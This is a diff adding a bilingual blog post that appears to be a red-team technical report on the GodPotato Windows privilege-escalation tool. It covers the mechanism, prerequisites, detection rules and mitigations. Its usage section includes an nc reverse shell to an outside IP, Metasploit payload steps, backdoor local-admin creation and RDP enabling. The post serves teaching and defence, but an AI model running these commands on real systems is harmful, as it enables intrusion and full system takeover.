@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+
+<html lang="th">
+<head>
+<script>
+(function(){var s=localStorage.getItem('siteLang');var a=(navigator.language||'').toLowerCase().startsWith('th')?'th':'en';document.documentElement.classList.add('lang-'+(s||a));})();
+</script>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>🥔 GodPotato  รายงานเชิงเทคนิค (Windows PrivEsc) | Sabastiaz</title>
+<meta content="GodPotato  Windows Privilege Escalation via RPCSS OXID Resolution abuse  Sabastiaz Red Team Sorcerer" name="description"/>
+<meta content="Ratthapong Sommanus (Sabastiaz)" name="author"/>
+<meta content="index, follow" name="robots"/>
+<meta content="#1a1008" name="theme-color"/>
+<meta content="🥔 GodPotato  รายงานเชิงเทคนิค (Windows PrivEsc) | Sabastiaz" property="og:title"/>
+<meta content="GodPotato  Windows Privilege Escalation via RPCSS OXID Resolution abuse  Sabastiaz Red Team Sorcerer" property="og:description"/>
+<meta content="https://sabastiaz.github.io/pic/Godpotato.png" property="og:image"/>
+<meta content="summary_large_image" name="twitter:card"/>
+<link href="../style.css" rel="stylesheet"/>
+<link href="../favicon.ico?v=6" rel="icon" type="image/x-icon"/>
+<link href="../favicon-32.png?v=6" rel="icon" sizes="32x32" type="image/png"/>
+<link href="../favicon-16.png?v=6" rel="icon" sizes="16x16" type="image/png"/>
+<link href="https://sabastiaz.github.io/blog/godpotato.html" rel="canonical"/>
+
+<style>
+    .post-back{display:inline-flex;align-items:center;gap:.4rem;font-family:'Cinzel',serif;font-size:.7rem;letter-spacing:.12em;color:var(--text-muted);text-decoration:none;margin-bottom:2rem;transition:color .2s}
+    .post-back:hover{color:var(--gold)}
+    .post-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid rgba(201,168,76,.15)}
+    .post-tags{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1rem}
+    .post-tag{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.08em;padding:.15rem .5rem;border-radius:2px}
+    .tag-en    {color:#6bc5d2;background:rgba(107,197,210,.1);border:1px solid rgba(107,197,210,.22)}
+    .tag-th    {color:#c39bd3;background:rgba(195,155,211,.1);border:1px solid rgba(195,155,211,.22)}
+    .tag-cert  {color:var(--gold2);background:rgba(201,168,76,.1);border:1px solid rgba(201,168,76,.22)}
+    .tag-lab   {color:#5dba6a;background:rgba(93,186,106,.1);border:1px solid rgba(93,186,106,.22)}
+    .tag-pentest{color:#e07b5a;background:rgba(224,123,90,.1);border:1px solid rgba(224,123,90,.22)}
+    .tag-life  {color:#a89bc2;background:rgba(168,155,194,.1);border:1px solid rgba(168,155,194,.22)}
+    .tag-ctf   {color:#63d4af;background:rgba(99,212,175,.1);border:1px solid rgba(99,212,175,.22)}
+    .post-meta-row{display:flex;align-items:center;gap:1.2rem;margin-bottom:1.2rem;font-size:.78rem;color:var(--text-muted)}
+    .post-meta-row .dot{opacity:.3}
+    .post-title{font-family:'Cinzel',serif;font-size:clamp(1.3rem,4vw,2rem);font-weight:700;color:var(--text);line-height:1.35;margin:0}
+    .post-body{max-width:740px;line-height:1.9;color:var(--text-muted);font-size:.97rem}
+    .post-body h2{font-family:'Cinzel',serif;font-size:1.05rem;font-weight:600;color:var(--gold);margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:1px solid rgba(201,168,76,.15)}
+    .post-body h3{font-family:'Cinzel',serif;font-size:.88rem;font-weight:600;color:var(--text);margin:1.8rem 0 .8rem}
+    .post-body h4{font-family:'Cinzel',serif;font-size:.8rem;font-weight:600;color:var(--text-muted);margin:1.4rem 0 .6rem}
+    .post-body p{margin:0 0 1.2rem}
+    .post-body ul,.post-body ol{padding-left:1.5rem;margin:0 0 1.2rem}
+    .post-body li{margin-bottom:.4rem}
+    .post-body strong{color:var(--text)}
+    .post-body em{font-style:italic}
+    .post-body code{font-family:'Courier New',monospace;font-size:.84rem;background:rgba(201,168,76,.07);border:1px solid rgba(201,168,76,.15);padding:.1rem .35rem;border-radius:3px;color:var(--gold2)}
+    .post-body pre{background:rgba(0,0,0,.45);border:1px solid rgba(201,168,76,.15);border-radius:4px;padding:1.2rem 1.4rem;overflow-x:auto;margin:0 0 1.5rem}
+    .post-body pre code{background:none;border:none;padding:0;font-size:.82rem;line-height:1.45;color:#c9c9c9}
+    .post-body table{width:100%;border-collapse:collapse;margin:0 0 1.5rem;font-size:.86rem}
+    .post-body th{font-family:'Cinzel',serif;font-size:.65rem;letter-spacing:.06em;color:var(--gold);text-align:left;padding:.6rem .8rem;border-bottom:1px solid rgba(201,168,76,.25)}
+    .post-body td{padding:.5rem .8rem;border-bottom:1px solid rgba(201,168,76,.08)}
+    .post-body tr:nth-child(even) td{background:rgba(201,168,76,.02)}
+    .post-body blockquote{border-left:3px solid var(--gold);padding:.8rem 1.4rem;margin:0 0 1.5rem;background:rgba(201,168,76,.04);border-radius:0 4px 4px 0;font-style:italic}
+    .post-body a{color:var(--gold);text-decoration:none}
+    .post-body a:hover{text-decoration:underline}
+    .post-body figure{margin:1.5rem 0 2rem;text-align:center}
+    .post-body figure img{max-width:100%;border-radius:6px;border:1px solid rgba(201,168,76,.12)}
+    .post-body figcaption{font-size:.75rem;color:var(--text-muted);margin-top:.5rem;font-style:italic}
+    .post-body hr{border:none;border-top:1px solid rgba(201,168,76,.15);margin:2rem 0}
+    .source-box{background:rgba(201,168,76,.05);border:1px solid rgba(201,168,76,.2);border-radius:4px;padding:.9rem 1.2rem;margin:0 0 2rem;font-size:.82rem}
+    .source-box p{margin:0 0 .25rem}
+    .source-box p:last-child{margin:0}
+    .post-footer{margin-top:4rem;padding-top:2.5rem;border-top:1px solid rgba(201,168,76,.15);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1.5rem}
+    .author-card{display:flex;align-items:center;gap:1rem}
+    .author-avatar{width:48px;height:48px;border-radius:50%;object-fit:cover;border:2px solid rgba(201,168,76,.3)}
+    .author-name{font-family:'Cinzel',serif;font-size:.85rem;font-weight:600;color:var(--text)}
+    .author-creds{font-size:.7rem;color:var(--text-muted);margin-top:.2rem}
+  .share-section{margin-top:3rem;padding:1.5rem 0;border-top:1px solid rgba(201,168,76,.1)}
+.share-label{font-family:'Cinzel',serif;font-size:.75rem;color:var(--text-muted);letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:.9rem}
+.share-buttons{display:flex;gap:.6rem;flex-wrap:wrap}
+.share-btn{display:inline-flex;align-items:center;gap:.45rem;padding:.45rem .9rem;border-radius:4px;font-size:.75rem;font-family:'Cinzel',serif;text-decoration:none;cursor:pointer;border:1px solid rgba(201,168,76,.25);background:rgba(201,168,76,.04);color:var(--text-muted);transition:border-color .2s,color .2s,background .2s}
+.share-btn:hover{border-color:var(--gold);color:var(--gold);background:rgba(201,168,76,.08)}
+.share-btn svg{flex-shrink:0}
+.lb[lang="en"]{display:none}
+html.lang-en .lb[lang="th"]{display:none}
+html.lang-en .lb[lang="en"]{display:block}
+.lang-pill{display:inline-flex;border:1px solid rgba(201,168,76,.3);border-radius:20px;overflow:hidden;font-family:'Cinzel',serif;font-size:.65rem;letter-spacing:.08em}
+.lang-pill a{padding:.28rem .6rem;text-decoration:none;color:var(--text-muted);transition:color .15s,background .15s;line-height:1}
+.lang-pill a.active{background:rgba(201,168,76,.18);color:var(--gold);pointer-events:none}
+.lang-pill a:not(.active):hover{background:rgba(201,168,76,.08);color:var(--text)}
+
+  .post-navlinks{display:flex;justify-content:space-between;gap:1rem;margin-top:1.5rem;flex-wrap:wrap}
+  .post-navlink{flex:1;min-width:200px;background:var(--surface2);border:1px solid rgba(201,168,76,.13);border-radius:4px;padding:1rem 1.2rem;text-decoration:none;transition:all .25s;display:flex;flex-direction:column;gap:.3rem}
+  .post-navlink:hover{border-color:rgba(201,168,76,.4);transform:translateY(-2px)}
+  .post-navlink.next{text-align:right;align-items:flex-end}
+  .post-navlink-label{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;color:var(--text-muted)}
+  .post-navlink-title{font-size:.85rem;color:var(--gold2);line-height:1.4}
+
+  .toc-toggle{position:fixed;top:6rem;left:1.25rem;z-index:850;width:2.4rem;height:2.4rem;border-radius:50%;background:rgba(12,10,8,.85);border:1px solid rgba(201,168,76,.3);color:var(--gold);font-size:1rem;cursor:pointer;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);transition:border-color .2s}
+  .toc-toggle:hover{border-color:var(--gold)}
+  .toc-panel{position:fixed;top:9.5rem;left:1.25rem;z-index:849;width:240px;max-height:60vh;overflow-y:auto;background:rgba(12,10,8,.95);border:1px solid rgba(201,168,76,.25);border-radius:6px;padding:1rem;display:none;backdrop-filter:blur(6px)}
+  .toc-panel.open{display:block}
+  .toc-panel-label{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.14em;text-transform:uppercase;color:var(--gold);opacity:.7;margin-bottom:.6rem}
+  .toc-list{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:.4rem}
+  .toc-list a{font-size:.78rem;color:var(--text-muted);text-decoration:none;line-height:1.4;display:block}
+  .toc-list a:hover{color:var(--gold)}
+  @media (max-width:1100px){.toc-toggle,.toc-panel{display:none}}
+</style>
+</head>
+<body>
+<canvas id="stars-canvas"></canvas>
+<nav>
+<a class="nav-logo" href="../index.html">Sabastiaz 🪄</a>
+<ul class="nav-links">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../about.html">About</a></li>
+<li><a href="../skills.html">Spells</a></li>
+<li><a href="../tools.html">Arsenal</a></li>
+<li><a class="active" href="../writings.html">Tomes</a></li>
+<li><a href="../honor.html">Honours</a></li>
+<li><a href="../wowza.html">Wowza</a></li>
+<li><a href="../event.html">Events</a></li>
+<li><a href="../changelog.html">Updates</a></li>
+<li><a href="../contact.html">Owl Post</a></li>
+<li><a href="../cocacola.html">🥤</a></li>
+</ul>
+<div class="lang-pill" id="lang-pill">
+<a class="lang-th" href="#">TH</a>
+<a class="lang-en" href="#">EN</a>
+</div>
+<button aria-expanded="false" aria-label="Menu" class="nav-hamburger" id="nav-hamburger"><span></span><span></span><span></span></button>
+</nav>
+
+<button class="toc-toggle" id="toc-toggle" aria-label="Table of contents">📜</button>
+<div class="toc-panel" id="toc-panel">
+  <div class="toc-panel-label">✦ Table of Contents ✦</div>
+  <ul class="toc-list" id="toc-list"></ul>
+</div>
+
+<div class="page">
+<div class="content">
+<a class="post-back" href="../writings.html">← Back to Tomes</a>
+<div class="post-header">
+<div class="post-tags">
+<span class="post-tag tag-th">TH</span>
+<span class="post-tag tag-pentest">Red Team</span>
+<span class="post-tag tag-lab">PrivEsc</span>
+</div>
+<div class="post-meta-row">
+<span>July 18, 2026</span><span class="dot">✦</span><span>18 min read</span>
+</div>
+<h1 class="post-title"><span class="lb" lang="en">GodPotato  Technical Report (Windows PrivEsc)</span><span class="lb" lang="th">🥔 GodPotato  รายงานเชิงเทคนิค (Windows PrivEsc)</span></h1>
+</div>
+
+<div class="post-body lb" lang="en">
+<div class="source-box">
+<p><strong>Security Research · Windows Privilege Escalation · For authorized use only</strong></p>
+<p><strong>Repository:</strong> <a href="https://github.com/BeichenDream/GodPotato" rel="noopener" target="_blank">BeichenDream/GodPotato</a> · v1.20 · C# · Apache 2.0 · Released December 2022</p>
+</div>
+
+<h2 id="s1">01 · What is GodPotato?</h2>
+<p><strong>GodPotato</strong> is a Windows Privilege Escalation tool developed by <strong>BeichenDream</strong>, released in December 2022. It's the latest evolution of the "Potato" family that security researchers have iterated on for over six years.</p>
+<p>The core goal: once an attacker has shell/code execution under a <strong>Service Account</strong> (e.g. IIS Application Pool, MSSQL Service, NETWORK SERVICE) that holds <code>SeImpersonatePrivilege</code>  GodPotato escalates it straight to <code>NT AUTHORITY\SYSTEM</code>.</p>
+<blockquote><strong>What makes it "God"</strong><br/>
+Unlike JuicyPotato, which needs a version-specific CLSID and fails on Windows Server 2019+, GodPotato abuses a flaw in <strong>RPCSS</strong>  a mandatory service that always runs in the SYSTEM context on every Windows version. That means it works on <strong>Windows 8 through Windows 11</strong> and <strong>Server 2012 through Server 2022</strong>, without needing any CLSID at all (since v1.20).</blockquote>
+
+<h3>Repository Info</h3>
+<table>
+<thead><tr><th>Property</th><th>Value</th></tr></thead>
+<tbody>
+<tr><td>Developer</td><td>BeichenDream</td></tr>
+<tr><td>Language</td><td>C# (.NET)</td></tr>
+<tr><td>License</td><td>Apache 2.0</td></tr>
+<tr><td>Released</td><td>December 23, 2022</td></tr>
+<tr><td>Latest update</td><td>v1.20 (April 11, 2023)</td></tr>
+<tr><td>GitHub Stars</td><td>~2,316</td></tr>
+<tr><td>Forks</td><td>~270</td></tr>
+</tbody>
+</table>
+
+<h3>Why it matters</h3>
+<ul>
+<li>Used in real pentest engagements across many organizations</li>
+<li>Found in actual malware campaigns in the wild</li>
+<li>Tested and working across nearly every Windows version</li>
+<li>No specific port or external relay required</li>
+<li>Single binary  extremely easy to use</li>
+</ul>
+
+<h2 id="s2">02 · Evolution of the Potato Family</h2>
+<p>The Potato exploit family has evolved continuously for over 6 years, each version fixing the shortcomings of the previous one:</p>
+
+<h3>Timeline</h3>
+<p><strong>2016  RottenPotato</strong><br/>
+The first technique, by @Stephen Fewer and @James Forshaw. Used NBNS spoofing + NTLM relay from the Windows Defender Update service to a fake COM server, then impersonated the SYSTEM token. <strong>Required Metasploit Meterpreter.</strong></p>
+<p><strong>2018  JuicyPotato</strong><br/>
+By @decoder_it and @ohpe. Improved on RottenPotato, no longer requiring Meterpreter. Used a version-specific CLSID list, required binding to port 1337. Worked well on Windows 7 – Server 2016, but <strong>failed on Server 2019+</strong> after Microsoft closed the BITS service exploitation path.</p>
+<p><strong>2020  RoguePotato</strong><br/>
+By @decoder_it and @splinter_code. Fixed the JuicyPotato issue on Server 2019 using cross-session COM activation and an RPC endpoint, but <strong>required an external relay server</strong>, making setup more complex.</p>
+<p><strong>2020  PrintSpoofer</strong><br/>
+By @itm4n. Used named pipe impersonation together with the Print Spooler service  no COM/CLSID needed, but <strong>required the Print Spooler service to be running</strong>, which many organizations have already disabled.</p>
+<p><strong>2022  JuicyPotatoNG</strong><br/>
+By @antonioCoco. Improved JuicyPotato using a new BITS service approach, but still required a CLSID list and carried some limitations.</p>
+<p><strong>2022 DEC  GodPotato ⭐ (latest)</strong><br/>
+By @BeichenDream. Abuses a flaw in <strong>RPCSS OXID Resolution</strong>  a mandatory service on every Windows install. No CLSID needed (v1.20+), no external relay, no specific service dependency. Works on everything from 2012–2022 and Win8–Win11.</p>
+
+<h3>Potato Family Comparison</h3>
+<table>
+<thead><tr><th>Tool</th><th>Win 7/2008</th><th>Win 10/2016</th><th>Win 11/2019+</th><th>Special requirement</th></tr></thead>
+<tbody>
+<tr><td>RottenPotato</td><td>✅</td><td>Some versions</td><td>❌</td><td>Meterpreter</td></tr>
+<tr><td>JuicyPotato</td><td>✅</td><td>✅</td><td>❌</td><td>Version-specific CLSID list</td></tr>
+<tr><td>RoguePotato</td><td>Partial</td><td>✅</td><td>✅</td><td>External relay server</td></tr>
+<tr><td>PrintSpoofer</td><td>❌</td><td>✅</td><td>If Spooler enabled</td><td>Print Spooler service</td></tr>
+<tr><td><strong>GodPotato</strong></td><td><strong>2012+</strong></td><td><strong>✅</strong></td><td><strong>✅</strong></td><td><strong>SeImpersonatePrivilege only</strong></td></tr>
+</tbody>
+</table>
+
+<h2 id="s3">03 · Technical Mechanism</h2>
+<h3>Core concept  RPCSS and OXID</h3>
+<p><strong>What is RPCSS?</strong><br/>
+<strong>Remote Procedure Call SubSystem (RPCSS)</strong> is a mandatory Windows service that's the core of the COM/DCOM infrastructure, handling inter-process communication. It always runs in the context of <strong>NT AUTHORITY\SYSTEM</strong> and <strong>cannot be disabled</strong>.</p>
+<p><strong>What is OXID?</strong><br/>
+<strong>Object eXporter IDentifier (OXID)</strong> identifies a COM server instance on Windows DCOM. When a client requests a COM object, RPCSS must perform <strong>OXID Resolution</strong> to find which endpoint the COM server lives at  this is the exact point GodPotato attacks.</p>
+
+<h3>Attack mechanism  4 main steps</h3>
+<p><strong>① Fake OXID Resolver</strong><br/>
+GodPotato registers itself as a fake OXID Resolver (a fake COM server), pointing its endpoint to a named pipe the attacker controls.</p>
+<p><strong>② Trigger DCOM Activation</strong><br/>
+GodPotato sends a DCOM object activation/marshaling request, forcing RPCSS to perform OXID resolution against the fake resolver.</p>
+<p><strong>③ RPCSS connects to the Named Pipe</strong><br/>
+RPCSS (running as SYSTEM) receives the response from the fake resolver and connects to the attacker's named pipe to talk to the "COM server."</p>
+<p><strong>④ Token Impersonation → SYSTEM</strong><br/>
+GodPotato calls <code>ImpersonateNamedPipeClient()</code> → obtains the SYSTEM token, then calls <code>CreateProcessWithToken()</code> to spawn a new process in the SYSTEM context.</p>
+
+<h3>Windows APIs used in the attack</h3>
+<table>
+<thead><tr><th>API Call</th><th>Purpose</th><th>Privilege required</th></tr></thead>
+<tbody>
+<tr><td><code>CreateNamedPipe()</code></td><td>Creates a named pipe server to wait for RPCSS to connect</td><td>User level</td></tr>
+<tr><td><code>CoCreateInstance() / CoMarshalInterface()</code></td><td>Triggers DCOM activation through the COM runtime</td><td>User level</td></tr>
+<tr><td><code>ConnectNamedPipe()</code></td><td>Waits for RPCSS (SYSTEM) to connect to the pipe</td><td>User level</td></tr>
+<tr><td><code>ImpersonateNamedPipeClient()</code></td><td>Steals the SYSTEM token from RPCSS's pipe connection</td><td>SeImpersonatePrivilege</td></tr>
+<tr><td><code>OpenThreadToken()</code></td><td>Opens the token obtained via impersonation</td><td></td></tr>
+<tr><td><code>DuplicateTokenEx()</code></td><td>Creates a primary token from the impersonation token</td><td></td></tr>
+<tr><td><code>CreateProcessWithTokenW()</code></td><td>Spawns a new process with the SYSTEM token</td><td>SeImpersonatePrivilege</td></tr>
+</tbody>
+</table>
+<blockquote><strong>Root Cause</strong><br/>
+RPCSS is a <strong>mandatory service</strong> that Microsoft designed to always run as SYSTEM, since it manages OS-level COM infrastructure. The OXID resolution "vulnerability" is normal protocol behavior being abused  not a classic "bug"  so it's hard to patch without breaking the entire Windows COM/DCOM ecosystem.</blockquote>
+
+<h2 id="s4">04 · Attack Flow Diagram</h2>
+<p>The full exploit is divided into 4 phases:</p>
+
+<h3>PHASE 1  Setup</h3>
+<pre><code>① GodPotato.exe starts
+   └─ Privilege: Service Account + SeImpersonatePrivilege
+
+② CreateNamedPipe()
+   └─ Creates Named Pipe: \\.\pipe\GodPotato-xxx
+
+③ Register Fake OXID Resolver
+   └─ Registers a fake COM endpoint
+   └─ Points endpoint → attacker's named pipe</code></pre>
+
+<h3>PHASE 2  Trigger RPCSS</h3>
+<pre><code>④ Attacker → RPCSS
+   CoCreateInstance() / CoMarshalInterface()
+   └─ Sends DCOM activation request ►
+
+⑤ RPCSS → Attacker
+   ◄ OXID resolution query
+   └─ "Where's the COM server?"
+
+⑥ Attacker → RPCSS
+   OXID response ►
+   └─ "COM server = \\.\pipe\GodPotato-xxx"</code></pre>
+
+<h3>PHASE 3  Token Theft</h3>
+<pre><code>⑦ RPCSS (NT AUTHORITY\SYSTEM) → Named Pipe
+   ◄ ConnectNamedPipe() succeeds!
+   └─ SYSTEM has connected
+
+⑧ ImpersonateNamedPipeClient()
+   └─ Steals SYSTEM token from RPCSS connection
+   └─ OpenThreadToken() → DuplicateTokenEx()
+   └─ ✅ Got the SYSTEM Token!</code></pre>
+
+<h3>PHASE 4  Execute as SYSTEM</h3>
+<pre><code>⑨ CreateProcessWithTokenW(SYSTEM_token, -cmd "...")
+   └─ Spawns a new process as NT AUTHORITY\SYSTEM
+   └─ ✅ cmd.exe / reverse shell / whatever -cmd specifies</code></pre>
+
+<h2 id="s5">05 · Prerequisites and Privileges</h2>
+<h3>Required Windows Privileges</h3>
+<table>
+<thead><tr><th>Privilege</th><th>Requirement</th><th>Notes</th></tr></thead>
+<tbody>
+<tr><td><code>SeImpersonatePrivilege</code></td><td><strong>Required</strong></td><td>The core privilege  lets you impersonate the token of a client connecting to the named pipe</td></tr>
+<tr><td><code>SeAssignPrimaryTokenPrivilege</code></td><td>Optional (situational)</td><td>Used to assign a token directly to a new process</td></tr>
+<tr><td><code>SeDebugPrivilege</code></td><td><strong>Not required</strong></td><td>GodPotato doesn't need this, unlike Mimikatz</td></tr>
+</tbody>
+</table>
+
+<h3>Accounts with SeImpersonatePrivilege by default</h3>
+<table>
+<thead><tr><th>Account / Service</th><th>Common scenario</th><th>Risk</th></tr></thead>
+<tbody>
+<tr><td><code>IIS APPPOOL\*</code></td><td>Web shell, RCE on IIS applications</td><td>🔴 Very high</td></tr>
+<tr><td><code>NT SERVICE\MSSQLSERVER</code></td><td>SQL injection + xp_cmdshell, stacked queries</td><td>🔴 Very high</td></tr>
+<tr><td><code>NETWORK SERVICE</code></td><td>Various services running under Network Service</td><td>🔴 High</td></tr>
+<tr><td><code>LOCAL SERVICE</code></td><td>Windows services configured to run as Local Service</td><td>🟡 Medium</td></tr>
+<tr><td><code>NT AUTHORITY\SYSTEM</code></td><td>Already has this privilege</td><td>✅ GodPotato not needed</td></tr>
+</tbody>
+</table>
+
+<h3>Checking privileges before use</h3>
+<pre><code># Check current account privileges
+whoami /priv
+
+# Expected output:
+# SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
+
+# Check current account
+whoami
+# IIS: iis apppool\defaultapppool  ← has SeImpersonate
+# MSSQL: nt service\mssqlserver    ← has SeImpersonate</code></pre>
+
+<h2 id="s6">06 · Supported Systems</h2>
+<h3>Windows Client</h3>
+<table>
+<thead><tr><th>Version</th><th>Supported</th></tr></thead>
+<tbody>
+<tr><td>Windows 8</td><td>✅</td></tr>
+<tr><td>Windows 8.1</td><td>✅</td></tr>
+<tr><td>Windows 10</td><td>✅ (all builds)</td></tr>
+<tr><td>Windows 11</td><td>✅</td></tr>
+</tbody>
+</table>
+<h3>Windows Server</h3>
+<table>
+<thead><tr><th>Version</th><th>Supported</th></tr></thead>
+<tbody>
+<tr><td>Server 2012</td><td>✅</td></tr>
+<tr><td>Server 2012 R2</td><td>✅</td></tr>
+<tr><td>Server 2016</td><td>✅</td></tr>
+<tr><td>Server 2019</td><td>✅</td></tr>
+<tr><td>Server 2022</td><td>✅</td></tr>
+</tbody>
+</table>
+<blockquote><strong>Why every version is supported</strong><br/>
+Because it targets <strong>RPCSS</strong>, a core Windows service whose OXID resolution behavior hasn't changed across any Windows version since Windows 2000. Microsoft can't "fix" this behavior without breaking the entire COM/DCOM ecosystem.</blockquote>
+
+<h2 id="s7">07 · Binary Files and .NET Versions</h2>
+<p>GodPotato ships 3 binaries depending on .NET Framework version:</p>
+<table>
+<thead><tr><th>Binary</th><th>.NET Version</th><th>Target systems</th><th>Notes</th></tr></thead>
+<tbody>
+<tr><td><code>GodPotato-NET2.exe</code></td><td>.NET 2.0</td><td>Windows Server 2003+</td><td>Very old systems without newer .NET</td></tr>
+<tr><td><code>GodPotato-NET35.exe</code></td><td>.NET 3.5</td><td>Windows Vista / Server 2008+</td><td>For legacy systems</td></tr>
+<tr><td><code>GodPotato-NET4.exe</code> ⭐</td><td>.NET 4.0+</td><td>Windows 7 / Server 2008 R2+</td><td><strong>Recommended</strong>  works on almost all modern systems</td></tr>
+</tbody>
+</table>
+<blockquote><strong>CLR Compatibility Issue</strong><br/>
+There are reports of GodPotato not working if the .NET CLR is loaded into the process in unusual ways (e.g. some C++ services that host the CLR). In that case, try running it via a separate process or with <code>cmd /c GodPotato.exe</code>.</blockquote>
+
+<h2 id="s8">08 · Commands and Usage Examples</h2>
+<h3>Basic Syntax</h3>
+<pre><code>GodPotato.exe -cmd "&lt;COMMAND&gt;"
+
+## Parameters:
+-cmd    Command to run in SYSTEM context (required)
+         Default: "cmd /c whoami"</code></pre>
+<h3>Proof of Concept</h3>
+<pre><code># Verify SYSTEM was actually obtained
+GodPotato-NET4.exe -cmd "cmd /c whoami"
+# Expected result: nt authority\system
+
+# Save output to a file
+GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\out.txt"
+type C:\Windows\Temp\out.txt</code></pre>
+<h3>Reverse Shell</h3>
+<pre><code># Reverse shell via netcat
+GodPotato-NET4.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.100 4444"
+
+# PowerShell encoded payload (recommended  avoids quote issues)
+GodPotato-NET4.exe -cmd "powershell -enc &lt;BASE64_ENCODED_COMMAND&gt;"</code></pre>
+<h3>Adding a Local Admin</h3>
+<pre><code># Add a local admin account
+GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ssw0rd! /add"
+GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators hacker /add"
+
+# Enable RDP
+GodPotato-NET4.exe -cmd "cmd /c reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+GodPotato-NET4.exe -cmd "cmd /c netsh advfirewall firewall add rule name=RDP protocol=TCP dir=in localport=3389 action=allow"</code></pre>
+<h3>With CrackMapExec / Metasploit</h3>
+<pre><code># Upload the file via CME then run it
+crackmapexec smb target -u user -p pass --put-file GodPotato-NET4.exe C:/Windows/Temp/gp.exe
+crackmapexec smb target -u user -p pass -x "C:\Windows\Temp\gp.exe -cmd \"cmd /c whoami\""
+
+# Use with the Metasploit web_delivery module
+# 1. msfconsole: use exploit/multi/script/web_delivery
+# 2. set payload windows/x64/meterpreter/reverse_tcp
+# 3. copy the PowerShell command from msf
+GodPotato-NET4.exe -cmd "powershell -enc &lt;MSF_POWERSHELL_PAYLOAD&gt;"</code></pre>
+<blockquote><strong>Common issue  Double Quotes</strong><br/>
+GodPotato has trouble with double quotes inside the command string. Escape them with <code>\"</code>, or better, base64-encode the command and pass it via <code>powershell -enc</code> to sidestep quote-escaping entirely.</blockquote>
+
+<h2 id="s9">09 · Detection</h2>
+<h3>Key Windows Event IDs</h3>
+<table>
+<thead><tr><th>Event ID</th><th>Event name</th><th>What to monitor</th></tr></thead>
+<tbody>
+<tr><td><strong>Event 4688</strong></td><td>Process Creation</td><td><code>w3wp.exe</code> / <code>sqlservr.exe</code> as parent of <code>cmd.exe</code>/<code>powershell.exe</code> running in SYSTEM context</td></tr>
+<tr><td><strong>Sysmon 17/18</strong></td><td>Named Pipe Created/Connected</td><td>A named pipe called <code>GodPotato-&lt;random&gt;</code> created by an IIS/MSSQL account</td></tr>
+<tr><td><strong>Sysmon Event 1</strong></td><td>Process Create with Token Elevation</td><td>Integrity Level jump: Medium → System without going through Windows authentication</td></tr>
+<tr><td><strong>Event 4673</strong></td><td>Privileged Service Called</td><td><code>SeImpersonatePrivilege</code> used outside of normal operation</td></tr>
+<tr><td><strong>AV/EDR Signatures</strong></td><td>Binary Detection</td><td>GodPotato.exe flagged by Defender, CrowdStrike, Carbon Black  monitor <code>csc.exe</code> dynamic compilation on production servers</td></tr>
+</tbody>
+</table>
+<h3>Sigma Rule</h3>
+<pre><code>title: Potato-style PrivEsc  Service Account SYSTEM Token
+status: stable
+description: Detects a service account spawning a process with SYSTEM integrity level
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        IntegrityLevel: 'System'
+        ParentImage|endswith:
+            - '\w3wp.exe'           # IIS worker
+            - '\sqlservr.exe'       # MSSQL
+            - '\tomcat.exe'         # Tomcat
+            - '\java.exe'           # Java app servers
+    condition: selection
+falsepositives:
+    - Very unlikely in production environments
+level: critical
+tags:
+    - attack.privilege_escalation
+    - attack.t1134.001</code></pre>
+<h3>MITRE ATT&amp;CK Mapping</h3>
+<table>
+<thead><tr><th>Technique</th><th>ID</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Access Token Manipulation: Token Impersonation/Theft</td><td>T1134.001</td><td><code>ImpersonateNamedPipeClient()</code> steals the SYSTEM token</td></tr>
+<tr><td>Exploitation for Privilege Escalation</td><td>T1068</td><td>Abuses RPCSS OXID resolution behavior</td></tr>
+<tr><td>Named Pipe</td><td>T1559.001</td><td>Creates a named pipe to receive the RPCSS connection</td></tr>
+</tbody>
+</table>
+
+<h2 id="s10">10 · Defense</h2>
+<h3>Mitigation Measures</h3>
+<table>
+<thead><tr><th>Measure</th><th>How</th><th>Level</th><th>Notes</th></tr></thead>
+<tbody>
+<tr><td><strong>Use gMSA instead of a regular service account</strong></td><td><code>New-ADServiceAccount -Name svc_iis</code> → auto password rotation, 240 characters</td><td>🔴 Highest</td><td>gMSA still has SeImpersonate, but reduces risk from password theft</td></tr>
+<tr><td><strong>Remove SeImpersonatePrivilege</strong></td><td>GPO → Security Settings → User Rights Assignment</td><td>🔴 Highest</td><td>May break IIS/SQL functionality  test first</td></tr>
+<tr><td><strong>Windows Defender Credential Guard</strong></td><td>Enable via GPO</td><td>🟡 Medium</td><td>Blocks credential theft but doesn't directly block GodPotato</td></tr>
+<tr><td><strong>Application Whitelisting (WDAC/AppLocker)</strong></td><td>Block execution of unsigned binaries</td><td>🟡 Medium</td><td>Attacker must re-sign GodPotato to bypass  adds friction</td></tr>
+<tr><td><strong>EDR Behavioral Detection</strong></td><td>CrowdStrike, SentinelOne, Defender for Endpoint</td><td>🟡 Medium</td><td>Detects pattern: named pipe impersonation + process elevation</td></tr>
+<tr><td><strong>Network Segmentation</strong></td><td>Restrict outbound traffic from web servers</td><td>🟡 Medium</td><td>Blocks reverse shells but doesn't prevent local PrivEsc</td></tr>
+<tr><td><strong>Sysmon + SIEM</strong></td><td>Deploy Sysmon + monitor Events 17/18 + 4688</td><td>🟢 Detection</td><td>Doesn't prevent, but enables fast detection</td></tr>
